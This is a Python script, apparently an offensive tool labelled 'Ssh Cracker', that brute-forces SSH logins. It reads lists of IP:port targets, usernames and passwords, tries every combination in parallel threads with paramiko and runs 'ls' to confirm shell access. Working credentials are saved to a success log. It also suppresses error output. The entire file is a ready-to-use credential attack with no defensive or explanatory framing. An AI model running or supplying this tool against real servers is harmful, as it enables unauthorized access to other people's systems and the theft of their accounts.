import os
import sys
import logging
from threading import Lock, Thread
from concurrent.futures import ThreadPoolExecutor, as_completed
import paramiko
import time
from queue import Queue
from colorama import Fore, Style, init

init()

banner = '''
 ____      _        ____                _
/ ___| ___| |__    / ___|_ __ __ _  ___| | _____ _ __
\___ \/ __| '_ \  | |   | '__/ _` |/ __| |/ / _ \ '__|
 ___) \__ \ | | | | |___| | | (_| | (__|   <  __/ |
|____/|___/_| |_|  \____|_|  \__,_|\___|_|\_\___|_|
                @secabuser \n'''
g = Fore.GREEN
r = Fore.RED
y = Fore.YELLOW
w = Fore.WHITE

logging.getLogger("paramiko").setLevel(logging.CRITICAL)
sys.stderr = open(os.devnull, 'w')
lock = Lock()

log_queue = Queue()

def async_log_writer():
    while True:
        filename, message = log_queue.get()
        if filename is None:
            break
        with open(filename, 'a') as file:
            file.write(message + '\n')
        log_queue.task_done()

def write_to_log(filename, message):
    log_queue.put((filename, message))

def clear_log_file(filename):
    with open(filename, 'w') as file:
        file.write("")

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def ssh_test_single(ip, port, username, password, timeout, success_log, error_log, no_access_log):
    global good, bad, all_check, ips_checked
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port=int(port), username=username, password=password, timeout=timeout)
        
        stdin, stdout, stderr = client.exec_command('ls')
        exit_status = stdout.channel.recv_exit_status()
        
        if exit_status == 0:
            success_message = f"{ip}:{port} | {username} | {password}"
            write_to_log(success_log, success_message)
            with lock:
                good += 1
        else:
            no_access_message = f"{ip}:{port} | {username} | {password}"
            write_to_log(no_access_log, no_access_message)
            with lock:
                bad += 1
    except paramiko.AuthenticationException:
        error_message = f"{ip}:{port} | {username} | {password}"
        write_to_log(error_log, error_message)
        with lock:
            bad += 1
    except Exception as e:
        error_message = f"{ip}:{port}: {e} | {username} | {password}"
        write_to_log(error_log, error_message)
        with lock:
            bad += 1
    finally:
        with lock:
            all_check += 1
            ips_checked += 1
        if 'client' in locals():
            client.close()

def ssh_test_multithreaded():
    global good, bad, all_check, ips_checked
    good, bad, all_check, ips_checked = 0, 0, 0, 0

    log_thread = Thread(target=async_log_writer, daemon=True)
    log_thread.start()

    clear_console()
    print(f"{g}{banner}{w}")

    ip_file = input(f"{g}[~]──╼ {w}Enter the path to the IP file > ")
    username_file = input(f"{g}[~]──╼ {w}Enter the path to the username file > ")
    password_file = input(f"{g}[~]──╼ {w}Enter the path to the password file > ")
    timeout = int(input(f"{g}[~]──╼ {w}Enter the SSH timeout (seconds) > "))
    max_workers = int(input(f"{g}[~]──╼ {w}Enter the maximum number of threads > "))

    if not os.path.isfile(ip_file) or not os.path.isfile(username_file) or not os.path.isfile(password_file):
        print(f"{r}[!] Error: One or more input files not found.{w}")
        return

    try:
        with open(ip_file, 'r') as file:
            ip_list = [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(f"{r}[!] Failed to read IP file: {e}{w}")
        return

    try:
        with open(username_file, 'r') as file:
            usernames = [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(f"{r}[!] Failed to read username file: {e}{w}")
        return

    try:
        with open(password_file, 'r') as file:
            passwords = [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(f"{r}[!] Failed to read password file: {e}{w}")
        return

    total_requests = len(ip_list)

    success_log = "success_log.txt"
    error_log = "error_log.txt"
    no_access_log = "no_access_log.txt"

    clear_log_file(success_log)
    clear_log_file(error_log)
    clear_log_file(no_access_log)

    def task(ip_line, username, password):
        try:
            ip, port = ip_line.split(":")
        except ValueError:
            error_message = f"{r}[!] Invalid format in line: {ip_line}{w}"
            write_to_log(error_log, error_message)
            with lock:
                bad += 1
            return

        ssh_test_single(ip, port, username, password, timeout, success_log, error_log, no_access_log)

    start_time = time.time()

    try:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            for ip_line in ip_list:
                for username in usernames:
                    for password in passwords:
                        futures.append(executor.submit(task, ip_line, username, password))
            for future in as_completed(futures):
                future.result()
                elapsed_time = time.time() - start_time
                ips_per_second = int(ips_checked / (elapsed_time + 1e-6))
                os.system('cls' if os.name == 'nt' else 'clear')
                print(banner)
                print(f"{g}Good: {good} | {r}Bad: {bad} | {y}All: {all_check}/{total_requests} | {w}IPs/s: {ips_per_second}", end='\r')
    finally:
        log_queue.put((None, None))
        log_thread.join()

    print(f"\n{g}[!] Scan completed.{w}")
    print(f"{g}[!] Success log: {success_log}{w}")
    print(f"{r}[!] Error log: {error_log}{w}")
    print(f"{y}[!] No Access log: {no_access_log}{w}")

if __name__ == "__main__":
    ssh_test_multithreaded()
